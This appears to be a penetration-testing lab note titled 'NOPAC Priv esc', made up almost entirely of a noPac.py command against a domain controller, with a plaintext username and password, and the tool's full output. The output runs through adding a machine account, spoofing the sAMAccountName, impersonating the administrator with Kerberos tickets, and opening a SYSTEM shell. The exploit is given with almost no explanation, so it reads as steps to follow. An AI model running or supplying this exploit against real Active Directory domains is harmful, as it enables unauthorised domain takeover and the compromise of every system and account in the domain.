# NOPAC Priv esc

```
python3 noPac.py DANTE.ADMIN/jdercov:'mypass123' -dc-ip 172.16.2.5 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target dante-dc02.dante.admin
[*] will try to impersonate administrator
[*] Adding Computer Account "WIN-83PASCHNXKL$"
[*] MachineAccount "WIN-83PASCHNXKL$" password = Ucb87k7uA4i9
[*] Successfully added machine account WIN-83PASCHNXKL$ with password Ucb87k7uA4i9.
[*] WIN-83PASCHNXKL$ object = CN=WIN-83PASCHNXKL,CN=Computers,DC=DANTE,DC=ADMIN
[*] WIN-83PASCHNXKL$ sAMAccountName == dante-dc02
[*] Saving a DC's ticket in dante-dc02.ccache
[*] Reseting the machine account to WIN-83PASCHNXKL$
[*] Restored WIN-83PASCHNXKL$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving a user's ticket in administrator.ccache
[*] Rename ccache to administrator_dante-dc02.dante.admin.ccache
[*] Attempting to del a computer with the name: WIN-83PASCHNXKL$
[-] Delete computer WIN-83PASCHNXKL$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>

whoami
nt authority\system
```
